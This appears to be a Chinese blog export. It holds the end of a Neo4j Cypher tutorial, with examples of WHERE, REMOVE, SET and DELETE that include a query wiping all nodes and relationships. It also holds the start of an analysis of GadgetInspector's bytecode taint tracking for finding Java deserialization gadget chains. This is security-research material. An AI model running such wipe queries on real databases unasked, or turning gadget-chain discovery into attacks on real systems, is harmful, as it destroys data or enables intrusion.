<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">MATCH (cust)-[r:DO_SHOPPING_WITH]-&gt;(cc) </span><br><span class="line">RETURN cust,cc</span><br></pre></td></tr></table></figure>

<h3 id="WHERE子句"><a href="#WHERE子句" class="headerlink" title="WHERE子句"></a>WHERE子句</h3><p>像SQL一样，Neo4j CQL在CQL MATCH命令中提供了WHERE子句来过滤MATCH查询的结果。</p>
<p><strong>简单WHERE子句语法</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">WHERE &lt;property-name&gt; &lt;comparison-operator&gt; &lt;value&gt;</span><br></pre></td></tr></table></figure>

<p>语法说明：</p>
<table>
<thead>
<tr>
<th>S.No.</th>
<th>语法元素</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>1</td>
<td>WHERE</td>
<td>它是一个Neo4j CQL关键字。</td>
</tr>
<tr>
<td>2</td>
<td>&lt;属性名称&gt;</td>
<td>它是节点或关系的属性名称。</td>
</tr>
<tr>
<td>3</td>
<td>&lt;比较运算符&gt;</td>
<td>它是Neo4j CQL比较运算符之一。</td>
</tr>
<tr>
<td>4</td>
<td>&lt;值&gt;</td>
<td>它是一个字面值，如数字文字，字符串文字等。</td>
</tr>
</tbody></table>
<p><strong>Neo4j CQL中的比较运算符</strong></p>
<p>Neo4j 支持以下的比较运算符，在 Neo4j CQL WHERE 子句中使用来支持条件</p>
<table>
<thead>
<tr>
<th>S.No.</th>
<th>布尔运算符</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>1.</td>
<td>=</td>
<td>它是Neo4j CQL“等于”运算符。</td>
</tr>
<tr>
<td>2.</td>
<td>&lt;&gt;</td>
<td>它是一个Neo4j CQL“不等于”运算符。</td>
</tr>
<tr>
<td>3.</td>
<td>&lt;</td>
<td>它是一个Neo4j CQL“小于”运算符。</td>
</tr>
<tr>
<td>4.</td>
<td>&gt;</td>
<td>它是一个Neo4j CQL“大于”运算符。</td>
</tr>
<tr>
<td>5.</td>
<td>&lt;=</td>
<td>它是一个Neo4j CQL“小于或等于”运算符。</td>
</tr>
<tr>
<td>6.</td>
<td>=</td>
<td>它是一个Neo4j CQL“大于或等于”运算符。</td>
</tr>
</tbody></table>
<p>我们可以使用布尔运算符在同一命令上放置多个条件。</p>
<p><strong>Neo4j CQL中的布尔运算符</strong></p>
<p>Neo4j支持以下布尔运算符在Neo4j CQL WHERE子句中使用以支持多个条件。</p>
<table>
<thead>
<tr>
<th>S.No.</th>
<th>布尔运算符</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>1</td>
<td>AND</td>
<td>它是一个支持AND操作的Neo4j CQL关键字。</td>
</tr>
<tr>
<td>2</td>
<td>OR</td>
<td>它是一个Neo4j CQL关键字来支持OR操作。</td>
</tr>
<tr>
<td>3</td>
<td>NOT</td>
<td>它是一个Neo4j CQL关键字支持NOT操作。</td>
</tr>
<tr>
<td>4</td>
<td>XOR</td>
<td>它是一个支持XOR操作的Neo4j CQL关键字。</td>
</tr>
</tbody></table>
<p><strong>示例</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">MATCH (emp:Employee) </span><br><span class="line">WHERE emp.name = <span class="string">'Abc'</span> OR emp.name = <span class="string">'Xyz'</span></span><br><span class="line">RETURN emp</span><br></pre></td></tr></table></figure>

<p>利用<code>WHERE</code>创建指定关系节点：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">MATCH (cust:Customer),(cc:CreditCard) </span><br><span class="line">WHERE cust.id = <span class="string">"1001"</span> AND cc.id= <span class="string">"5001"</span> </span><br><span class="line">CREATE (cust)-[r:DO_SHOPPING_WITH&#123;shopdate:<span class="string">"12/12/2014"</span>,price:<span class="number">55000</span>&#125;]-&gt;(cc) </span><br><span class="line">RETURN r</span><br></pre></td></tr></table></figure>

<p>有必要补充一下，可以不使用WHERE达到<code>WHERE</code>的一些效果，比如</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">MATCH p=(m:Bot&#123;id:<span class="number">123</span>&#125;)&lt;-[:BotRelation]-&gt;(:Bot)  RETURN p</span><br></pre></td></tr></table></figure>

<h3 id="DELETE删除"><a href="#DELETE删除" class="headerlink" title="DELETE删除"></a>DELETE删除</h3><p>Neo4j使用CQL DELETE子句</p>
<ul>
<li>删除节点。</li>
<li>删除节点及相关节点和关系。</li>
</ul>
<p><strong>DELETE节点子句语法</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">DELETE &lt;node-name-list&gt;</span><br></pre></td></tr></table></figure>

<p><strong>示例</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">MATCH (e: Employee) DELETE e</span><br></pre></td></tr></table></figure>

<p><strong>DELETE节点和关系子句语法</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">DELETE &lt;node1-name&gt;,&lt;node2-name&gt;,&lt;relationship-name&gt;</span><br></pre></td></tr></table></figure>

<p><strong>示例</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">MATCH (cc: CreditCard)-[rel]-(c:Customer) </span><br><span class="line">DELETE cc,c,rel</span><br></pre></td></tr></table></figure>

<h4 id="删除所有节点与关系——delete"><a href="#删除所有节点与关系——delete" class="headerlink" title="删除所有节点与关系——delete"></a>删除所有节点与关系——delete</h4><p>删除单个节点：<code>MATCH (n:Useless) DELETE n;</code><br>删除单个节点和连接它的关系：<code>MATCH (n { name: &#39;Andres&#39; })-[r]-() DELETE n, r</code><br>删除所有节点和关系：<code>MATCH (n) OPTIONAL MATCH (n)-[r]-() DELETE n,r</code></p>
<p>删除某一类关系：<code>match (n)-[r:created]-() DELETE r</code></p>
<h3 id="REMOVE删除"><a href="#REMOVE删除" class="headerlink" title="REMOVE删除"></a>REMOVE删除</h3><p>有时基于我们的客户端要求，我们需要向现有节点或关系添加或删除属性。</p>
<p>我们使用Neo4j CQL SET子句向现有节点或关系添加新属性。</p>
<p>我们使用Neo4j CQL REMOVE子句来删除节点或关系的现有属性。</p>
<p>Neo4j CQL REMOVE命令用于</p>
<ul>
<li>删除节点或关系的标签</li>
<li>删除节点或关系的属性</li>
</ul>
<p>Neo4j CQL DELETE和REMOVE命令之间的主要区别 -</p>
<ul>
<li>DELETE操作用于删除节点和关联关系。</li>
<li>REMOVE操作用于删除标签和属性。</li>
</ul>
<p>Neo4j CQL DELETE和REMOVE命令之间的相似性 -</p>
<ul>
<li>这两个命令不应单独使用。</li>
<li>两个命令都应该与MATCH命令一起使用。</li>
</ul>
<p><strong>1.REMOVE属性子句语法</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">REMOVE &lt;node-name&gt;.&lt;property1-name&gt;,&lt;node-name&gt;.&lt;property2-name&gt;</span><br></pre></td></tr></table></figure>

<p><strong>示例</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">MATCH (dc:DebitCard) </span><br><span class="line">REMOVE dc.cvv</span><br><span class="line">RETURN dc</span><br></pre></td></tr></table></figure>

<p><strong>2.REMOVE一个Label子句语法：</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">REMOVE &lt;label-name-list&gt;</span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th>S.No.</th>
<th>语法元素</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>1.</td>
<td>REMOVE</td>
<td>它是一个Neo4j CQL关键字。</td>
</tr>
<tr>
<td>2.</td>
<td></td>
<td>它是一个标签列表，用于永久性地从节点或关系中删除它。</td>
</tr>
</tbody></table>
<p>语法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;node-name&gt;:&lt;label2-name&gt;, </span><br><span class="line">.... </span><br><span class="line">&lt;node-name&gt;:&lt;labeln-name&gt; 复制代码</span><br></pre></td></tr></table></figure>

<h4 id="删除标签与属性——remove"><a href="#删除标签与属性——remove" class="headerlink" title="删除标签与属性——remove"></a>删除标签与属性——remove</h4><p>删除属性：<code>MATCH (andres { name: &#39;Andres&#39; }) REMOVE andres.age RETURN andres;</code><br>删除节点的标签：<code>MATCH (n { name: &#39;Peter&#39; }) REMOVE n:German RETURN n;</code><br>删除多重标签：<code>MATCH (n { name: &#39;Peter&#39; }) REMOVE n:German:Swedish RETURN n</code></p>
<h3 id="SET子句"><a href="#SET子句" class="headerlink" title="SET子句"></a>SET子句</h3><p>有时，根据我们的客户端要求，我们需要向现有节点或关系添加新属性。</p>
<p>要做到这一点，Neo4j CQL提供了一个SET子句。</p>
<p>Neo4j CQL已提供SET子句来执行以下操作。</p>
<ul>
<li>向现有节点或关系添加新属性</li>
<li>添加或更新属性值</li>
</ul>
<p><strong>SET子句语法</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">SET  &lt;node-label-name&gt;.&lt;property1-name&gt;,...&lt;node-laben-name&gt;.&lt;propertyn-name&gt;复制代码</span><br></pre></td></tr></table></figure>

<p>语法说明：</p>
<table>
<thead>
<tr>
<th>S.No.</th>
<th>语法元素</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>1</td>
<td>&lt;节点标签名称&gt;</td>
<td>这是一个节点的标签名称。</td>
</tr>
<tr>
<td>2</td>
<td>&lt;属性名称&gt;</td>
<td>它是一个节点的属性名。</td>
</tr>
</tbody></table>
<p><strong>示例</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">MATCH (dc:DebitCard)</span><br><span class="line">SET dc.atm_pin = <span class="number">3456</span></span><br><span class="line">RETURN dc</span><br></pre></td></tr></table></figure>



<h2 id="模式匹配"><a href="#模式匹配" class="headerlink" title="模式匹配"></a>模式匹配</h2><p>模式匹配是Cypher语句的重要部分</p>
<p><img src="../images/Neo4j%E7%88%AC%E5%9D%91%E8%AE%B0/image-20201218162301263.png" alt="image-20201218162301263"></p>
<p>当描述关系时，在方括号里面的冒号（：）后面指定关系的类型。当建立关系（句法上大小写敏感）时，类型必须与它定义的类型严格一致。这个简单的查询使用[：HAS_SEEN]句法描述了单个HAS_SEEN关系。</p>
<p>关系方向的描述是在Cypher中用ASCII实现的。关系的连接是用ASCII箭 头（单个连字符接着一个大于号或前面有一个小于号[]-&gt;或&lt;-[]）连接着它 的端点。关系的起点使用单个连字符连接（[]-）。在前面的例子中，匹配用户看过的电影（match（user）-[：HAS_SEEN]-&gt;（movie））模式指定了从user节点指向movie节点的HAS_SEEN关系。</p>
<p>在Cypher查询中，节点和关系都可以与标识关联，这种关联使得以后可以在同样的查询中引用同一个图形实体。下面的例子在返回语句中引用了 movie节点。</p>
<p><img src="../images/Neo4j%E7%88%AC%E5%9D%91%E8%AE%B0/image-20201218162951725.png" alt="image-20201218162951725"></p>
<h2 id="个人备忘"><a href="#个人备忘" class="headerlink" title="个人备忘"></a>个人备忘</h2><figure class="highlight css"><table><tr><td class="code"><pre><span class="line">LOAD CSV WITH HEADERS FROM "file:///Users/Desktop/workJava/ossez/classes.csv" as line</span><br><span class="line"><span class="selector-tag">MERGE</span> (<span class="selector-tag">n</span><span class="selector-pseudo">:node</span> &#123;<span class="attribute">classname</span>:line.ClassName&#125;) <span class="selector-tag">RETURN</span> <span class="selector-tag">n</span></span><br></pre></td></tr></table></figure>



<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">MATCH</span> (<span class="selector-tag">n</span>)</span><br><span class="line"><span class="selector-tag">OPTIONAL</span> <span class="selector-tag">MATCH</span> (<span class="selector-tag">n</span>)<span class="selector-tag">-</span><span class="selector-attr">[r]</span><span class="selector-tag">-</span>()</span><br><span class="line"><span class="selector-tag">DELETE</span> <span class="selector-tag">n</span>,<span class="selector-tag">r</span></span><br></pre></td></tr></table></figure>



<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">结点可以没有名字 但是label一定要有</span><br><span class="line"></span><br><span class="line">nodename：labelname</span><br></pre></td></tr></table></figure>





<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">//4个人</span><br><span class="line">CREATE (t:person &#123;name:&quot;tom&quot;, age:35, address: &quot;beijing&quot;&#125;)</span><br><span class="line">CREATE (p:person &#123;name:&quot;peter&quot;, age:25, address: &quot;nanjing&quot;&#125;)</span><br><span class="line">CREATE (a:person &#123;name:&quot;alice&quot;, age:30, address: &quot;hebei&quot;&#125;)</span><br><span class="line">CREATE (d:person &#123;name:&quot;donny&quot;, age:23, address: &quot;hunan&quot;&#125;)</span><br><span class="line"></span><br><span class="line">//3个宠物</span><br><span class="line">CREATE (a:pet &#123;name:&quot;doga&quot;, age:23, address: &quot;hunan&quot;&#125;)</span><br><span class="line">CREATE (b:pet &#123;name:&quot;dogb&quot;, age:23, address: &quot;hunan&quot;&#125;)</span><br><span class="line">CREATE (c:pet &#123;name:&quot;dogc&quot;, age:23, address: &quot;hunan&quot;&#125;)</span><br><span class="line"></span><br><span class="line">//5部电影</span><br><span class="line">CREATE (h:movie &#123;name:&quot;hulk&quot;, date:2002, nation: &quot;usa&quot;&#125;)</span><br><span class="line">CREATE (ca:movie &#123;name:&quot;captainamerican&quot;, date:2008, nation: &quot;usa&quot;&#125;)</span><br><span class="line">CREATE (he:movie &#123;name:&quot;hawkeye&quot;, date:2010, nation: &quot;usa&quot;&#125;)</span><br><span class="line">CREATE (i:movie &#123;name:&quot;ironman&quot;, date:2011, nation: &quot;usa&quot;&#125;)</span><br><span class="line">CREATE (w:movie &#123;name:&quot;widow&quot;, date:2020, nation: &quot;usa&quot;&#125;)</span><br><span class="line"></span><br><span class="line">//创建关系</span><br><span class="line"></span><br><span class="line">MATCH (t:person),(a:pet)</span><br><span class="line">WHERE t.name = &quot;tom&quot; AND a.name = &quot;doga&quot;</span><br><span class="line">CREATE (t)-[f:feed]-&gt;(a) </span><br><span class="line"></span><br><span class="line">MATCH (t:person &#123;name:&quot;tom&quot;&#125;),(a:pet &#123;name:&quot;doga&quot;&#125;)</span><br><span class="line">CREATE (t)-[f:feed]-&gt;(a) </span><br><span class="line"></span><br><span class="line">MERGE (t:person &#123;name:&quot;tom&quot;&#125;)-[f:feed]-&gt;(a:pet &#123;name:&quot;doga&quot;&#125;)</span><br><span class="line"></span><br><span class="line">//查询属性里有date值为2002年的东西</span><br><span class="line">match(n) </span><br><span class="line">where n.date=2002 </span><br><span class="line">return n</span><br><span class="line"></span><br><span class="line">match(n&#123;date:2002&#125;) </span><br><span class="line">return n</span><br><span class="line"></span><br><span class="line">// Get some data</span><br><span class="line"></span><br><span class="line">MATCH (n1)-[r]-&gt;(n2) RETURN r, n1, n2 LIMIT 25</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//删除person结点</span><br><span class="line">match (n:person) delete n</span><br><span class="line"></span><br><span class="line">//只是删除feed关系  </span><br><span class="line">MATCH p=()-[f:feed]-&gt;() DELETE f</span><br><span class="line"></span><br><span class="line">match (n)-[f:feed]-()</span><br><span class="line">detach delete f</span><br></pre></td></tr></table></figure>



]]></content>
      <categories>
        <category>图数据库</category>
      </categories>
      <tags>
        <tag>Neo4j</tag>
      </tags>
  </entry>
  <entry>
    <title>GadgetInspector源码分析</title>
    <url>/GadgetInspector%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<h1 id="序言"><a href="#序言" class="headerlink" title="序言"></a>序言</h1><blockquote>
<p>好风凭借力，送我上青云。</p>
</blockquote>
<p>今天来分析<a href="https://github.com/JackOfMostTrades/gadgetinspector" target="_blank" rel="noopener">gadgetinspector</a>源码。</p>
<a id="more"></a>

<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p><a href="https://www.youtube.com/watch?v=wPbW6zQ52w8" target="_blank" rel="noopener">Ian Haken</a>于2018年第26届DEFCON提出来的工具，主要是用来找出jar包内部的调用链。</p>
<p>这个工具有些地方很值得学习，总结一下。</p>
<p><a href="https://paper.seebug.org/1034/" target="_blank" rel="noopener">关于这个工具</a>：</p>
<ul>
<li>这个工具不是用来寻找漏洞，而是利用已知的source-&gt;…-&gt;sink链或其相似特征发现分支利用链或新的利用链。</li>
<li>这个工具是在整个应用的classpath中寻找利用链。</li>
<li>这个工具进行了一些合理的预估风险判断（污点判断、污点传递等）。</li>
<li>这个工具会产生误报不是漏报（其实这里还是会漏报，这是作者使用的策略决定的，在后面的分析中可以看到）。</li>
<li>这个工具是基于字节码分析的，对于Java应用来说，很多时候我们并没有源码，而只有War包、Jar包或class文件。</li>
<li>这个工具不会生成能直接利用的Payload，<strong>具体的利用构造还需要人工参与</strong>。</li>
</ul>
<p>在分析gadgetinspector源码的时候，大概会在以下几<a href="https://xz.aliyun.com/t/7058" target="_blank" rel="noopener">方面</a>去讲解，并核心分析ASM部分，详细讲解如何进行污点分析：</p>
<ol>
<li>GadgetInspector：main方法，程序的入口，做一些配置以及数据的准备工作</li>
<li>MethodDiscovery：类、方法数据以及父子类、超类关系数据的搜索</li>
<li>PassthroughDiscovery：分析参数能影响到返回值的方法，并收集存储</li>
<li>CallGraphDiscovery：记录调用者caller方法和被调用者target方法的参数关联</li>
<li>SourceDiscovery：入口方法的搜索，只有具备某种特征的入口才会被标记收集</li>
<li>GadgetChainDiscovery：整合以上数据，并通过判断调用链的最末端slink特征，从而判断出可利用的gadget chain</li>
</ol>
<h1 id="流程介绍"><a href="#流程介绍" class="headerlink" title="流程介绍"></a>流程介绍</h1><p>先写在这里：</p>
<p>ASM的方法描述符：</p>
<p>方法描述符使用小括号开始，小括号内部是方法入参的类型描述符按照顺序拼接的字符串，在加上返回值的类型描述符组成，返回值是void的时候，使用<strong>V</strong>。方法的描述符不包含方法名和参数名。</p>
<h2 id="初始化"><a href="#初始化" class="headerlink" title="初始化"></a>初始化</h2><p><em>加载jar包内部类</em></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//初始化jar包，获得一个类加载器，该类加载器已经将其加载</span></span><br><span class="line">ClassLoader classLoader = initJar(args);</span><br></pre></td></tr></table></figure>

<p>跟进<em>initJar</em>函数：</p>
<p><img src="../images/GadgetInspector%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20201117095645316.png" alt="image-20201117095645316"></p>
<p>可以看到<em>initJar</em>将启动参数参数内的jar都保存到path里面，然后继续调用<em>getJarClassLoader</em>函数：</p>
<p><em>getJarClassLoader:</em></p>
<ul>
<li><p>在项目路径下，创建临时文件夹exploded-jar，在jvm shutdown自动删除；</p>
</li>
<li><p>接着将jar包内容提取到临时文件夹内部，这里面会有</p>
</li>
</ul>
<p><img src="../images/GadgetInspector%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20201117102333361.png" alt="image-20201117102333361"></p>
<ul>
<li>接着使用URLClassLoader将jarpath加载到类加载器，并返回这个类加载器；</li>
</ul>
<p><img src="../images/GadgetInspector%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20201117102613592.png" alt="image-20201117102613592"></p>
<h2 id="包装类加载器"><a href="#包装类加载器" class="headerlink" title="包装类加载器"></a>包装类加载器</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//获取类加载器</span></span><br><span class="line"><span class="keyword">final</span> ClassResourceEnumerator classResourceEnumerator = <span class="keyword">new</span> ClassResourceEnumerator(classLoader);</span><br></pre></td></tr></table></figure>

<p>这里就是将上一步加载我们jar的类加载器classLoader传入ClassResourceEnumerator。</p>
<p>跟进ClassResourceEnumerator：</p>
<p><img src="../images/GadgetInspector%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20201117104353938.png" alt="image-20201117104353938"></p>
<p>最关键的是这两个函数，分析一下：</p>
<p><img src="../images/GadgetInspector%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20201117104440730.png" alt="image-20201117104440730"></p>
<p><img src="../images/GadgetInspector%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20201117104455288.png" alt="image-20201117104455288"></p>
<p>可以看到<em>getAllClasses()</em>函数首先调用<em>getRuntimeClasses()</em>函数，那么跟进<em>getRuntimeClasses()</em>仔细看：</p>
<p>目的是将rt.jar加载到这里作者注释也写到他用了一个<strong>比较hacky</strong>的方式：</p>
<p>他先获取JDK内部的String类的路径，加载String类的同时，类加载器还会将rt.jar的全部类一起加载，那么最后就是将rt.jar的所有类都加入到ClassResource类型的result并且返回。</p>
<p>其实就是获取rt.jar的所有class。</p>
<p>回到<em>getAllClasses()</em>函数，其实拿到rt.jar之后，继续将传入的jar包内的类加入到result，并最后返回。</p>
<p>总结：</p>
<ul>
<li><code>getRuntimeClasses</code>获取rt.jar的所有class</li>
<li><code>getAllClasses</code>获取rt.jar以及classLoader加载的class</li>
</ul>
<h2 id="方法探索-MethodDiscovery"><a href="#方法探索-MethodDiscovery" class="headerlink" title="方法探索 MethodDiscovery"></a>方法探索 MethodDiscovery</h2><p><img src="../images/GadgetInspector%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20201117111114802.png" alt="image-20201117111114802"></p>
<h3 id="discover"><a href="#discover" class="headerlink" title="discover()"></a>discover()</h3><p><img src="../images/GadgetInspector%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20201117111206892.png" alt="image-20201117111206892"></p>
<p>该函数接收一个ClassResourceEnumerator类型的参数，这个参数主要将之前的类加载器(rt全部类+分析类)都包装并且传入。</p>
<p>获取每一个class类对象之后，进行ASM分析环节。</p>
<p>首先，看到在<code>discover</code>方法中获取了所有的类，并通过<code>MethodDiscoveryClassVisitor</code>去记录类和类方法信息。</p>
<p>跟进<code>MethodDiscoveryClassVisitor</code>去看看：</p>
<p><img src="../images/GadgetInspector%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20201117115215131.png" alt="image-20201117115215131"></p>
<p>这里其实会将我们所有类内部的元素进行存储，例如类名、父类名、接口、是否为接口、类的全部字段、classHandle把位。</p>
<p><img src="../images/GadgetInspector%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20201117115411195.png" alt="image-20201117115411195"></p>
<p>在ASM里，visit和visitEnd方法是一定会调用的，其他会按顺序来调用，那么这里就是：</p>
<ol>
<li>visit                  访问类的头部</li>
<li>visitField          访问类属性</li>
<li>visitMethod    访问类方法</li>
<li>visitEnd</li>
</ol>
<h3 id="save"><a href="#save" class="headerlink" title="save()"></a>save()</h3><p>saveData方法中会通过调用factory的serialize对数据进行序列化，然后一行一行的输出</p>
<p><img src="../images/GadgetInspector%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20201117144908462.png" alt="image-20201117144908462"></p>
<p>这里重点看<em>derive</em>函数：</p>
<p><img src="../images/GadgetInspector%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20201117160457359.png" alt="image-20201117160457359"></p>
<p>这里说一下最后的翻转，跟进去：</p>
<p><img src="../images/GadgetInspector%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20201117165701353.png" alt="image-20201117165701353"></p>
<p>最后的save函数，保存格式为子类：父类：</p>
<p><img src="../images/GadgetInspector%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20201117165758797.png" alt="image-20201117165758797"></p>
<p>这里说一下InheritanceMap是一个类，有两个fields：</p>
<ol>
<li>inheritanceMap 存放是子-&gt;父集合</li>
<li>subClassMap存放的是父-&gt;子集合</li>
</ol>
<h2 id="流程图探索-PassthroughDiscovery"><a href="#流程图探索-PassthroughDiscovery" class="headerlink" title="流程图探索 PassthroughDiscovery"></a>流程图探索 PassthroughDiscovery</h2><p>在这环节中，需要将上一环节的成果也就是classes.dat，methods.dat和inheritanceMap.dat都利用起来。</p>
<p>这里的passthrough数据流指的是<strong>每个方法的返回结果</strong>与<strong>方法参数</strong>的关系，这一步生成的数据会在生成passthrough调用图时用到。</p>
<p>主要用以发现<strong>函数返回值</strong>与<strong>传进来参数之间</strong>的<strong>污点关系</strong>，工作量最大的一个部分。</p>
<p>参考<a href="https://paper.seebug.org/1034/#step2-passthrough" target="_blank" rel="noopener">seebug</a>，先看作者的一个demo：</p>
<p><img src="../images/GadgetInspector%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20210316110702699.png" alt="image-20210316110702699"></p>
<p>成员/this，都是0；参数为1；</p>
<p>FnConstant.invoke返回值与参数this(参数0，因为序列化时类的所有成员我们都能控制，<strong>所以所有成员变量都视为0参</strong>)、arg(参数1)的关系：</p>
<ul>
<li>与this的关系：返回了this.value，即与0参有关系</li>
<li>与arg的关系：返回值与arg没有任何关系，即与1参没有关系</li>
<li>结论就是FnConstant.invoke与参数0有关，表示为FnConstant.invoke()-&gt;0</li>
</ul>
<p>Fndefault.invoke返回值与参数this(参数0)、arg(参数1)的关系：</p>
<ul>
<li>与this的关系：返回条件的第二个分支与this.f有关系，即与0参有关系</li>
<li>与arg的关系：返回条件的第一个分支与arg有关系，即与1参有关系</li>
<li>结论就是FnConstant.invoke与0参，1参都有关系，表示为Fndefault.invoke()-&gt;0、Fndefault.invoke()-&gt;1</li>
</ul>
<p>回到gi，gadgetinspector是利用ASM来进行方法字节码的分析，主要逻辑是在类PassthroughDiscovery和TaintTrackingMethodVisitor中。特别是TaintTrackingMethodVisitor，它通过==标记追踪JVM虚拟机在执行方法时的stack和localvar==，并最终得到返回结果是否可以被参数标记污染。</p>
<p>不仅仅是信息搜集，还要做污点的信息判断，以及方法间的变量关联。</p>
<p><img src="../images/GadgetInspector%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20201117170319531.png" alt="image-20201117170319531"></p>
<h3 id="discover-1"><a href="#discover-1" class="headerlink" title="discover()"></a>discover()</h3><p>这段很复杂 写个调用顺序在这：</p>
<p>discoverMethodCalls-&gt;MethodCallDiscoveryClassVisitor-&gt;MethodCallDiscoveryMethodVisitor-&gt;更新calledMethods和methodCalls集合;</p>
<p>topologicallySortMethodCalls-&gt;获得sortedMethods集合，存放着方法调用链逆拓扑结果</p>
<p>calculatePassthroughDataflow-&gt;PassthroughDataflowClassVisitor-&gt;PassthroughDataflowMethodVisitor</p>
<p>跟进discover方法，可以看到首先对之前的结果进行了加载：</p>
<p><img src="../images/GadgetInspector%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20201117204635986.png" alt="image-20201117204635986"></p>
<p>跟进<em>discoverMethodCalls</em>函数：</p>
<p><img src="../images/GadgetInspector%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20201117204716978.png" alt="image-20201117204716978"></p>
<p>可以看到又按照访问者模式，进行了ASM分析，跟进<em>MethodCallDiscoveryClassVisitor</em> :</p>
<p><img src="../images/GadgetInspector%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20201117205029118.png" alt="image-20201117205029118"></p>
<p>可以看到内部重写了下面的方法，并且会按照顺序进行执行：</p>
<ul>
<li>visit：把当前观察的类名赋值到了this.name</li>
<li>visitMethod：继续进一步的对被观察类的每一个方法细节进行观察，传入了当前观察的类名和方法名</li>
<li>visitEnd：除了super，啥也没干</li>
</ul>
<p>看到在visitMethod时候，进行了<em>MethodCallDiscoveryMethodVisitor</em>，跟进看看：</p>
<p><img src="../images/GadgetInspector%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20201117205544372.png" alt="image-20201117205544372"></p>
<p><em>MethodCallDiscoveryMethodVisitor</em>继承了ASM的MethodVisitor的构造函数，</p>
<p>在MethodCallDiscoveryMethodVisitor构造方法执行的时候，会对this.calledMethods集合进行初始化，该集合的主要作用是在被观察方法对其他方法进行调用时（会执行visitMethodInsn方法），用于缓存记录被调用的方法，因此，我们可以看到visitMethodInsn方法中：</p>
<p><img src="../images/GadgetInspector%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20201119092039034.png" alt="image-20201119092039034"></p>
<p>理解：calledMethods存放的是被调用的方法，ASM对于正在visit的方法，在visit的时候，如果在方法内出现了调用其他方法的行为，那么就会执行visitMethodInsn方法，它会将被调用的方法记录在calledMethods这个hashset集合内。</p>
<p>并且在构造方法执行的时候，集合calledMethods也会被添加到gadgetinspector.PassthroughDiscovery#methodCalls中，做全局性的收集，因此，最后我们能通过discoverMethodCalls这一个方法，实现对这样一个数据的全量收集：</p>
<p><img src="../images/GadgetInspector%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20201119093509631.png" alt="image-20201119093509631"></p>
<p>接下来调用<em>topologicallySortMethodCalls</em>，</p>
<p><img src="../images/GadgetInspector%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20201119093735153.png" alt="image-20201119093735153"></p>
<p>跟进去：</p>
<p><img src="../images/GadgetInspector%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20201119095514058.png" alt="image-20201119095514058"></p>
<p>这里就开始了重头戏，DFS+逆拓扑。</p>
<p>这里重点参考<a href="https://paper.seebug.org/1034/" target="_blank" rel="noopener">404</a>的这篇文章，原理讲得很清楚。</p>
<p>在开始逆拓扑之前，可以看到作者首先准备了三个数据结构：</p>
<ul>
<li>dfsStack：栈，用来分析方法调用顺序，也用于在在逆拓扑时候不会形成环</li>
<li>visitedNodes：访问过的结点，在一条调用链出现重合的时候，不会造成重复的排序</li>
<li>sortedMethods：最终逆拓扑排序出来的结果集合</li>
</ul>
<p>跟进dfsTsort：</p>
<p><img src="../images/GadgetInspector%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20201120092931396.png" alt="image-20201120092931396"></p>
<p>dfsTsort是一个迭代函数：</p>
<p>判断条件：</p>
<ol>
<li>对于待分析的方法，如果stack里面已经有了，那就不再入栈了</li>
<li>如果之前已经分析过某方法（visitedNodes已经存在），那么也不会再入栈了</li>
</ol>
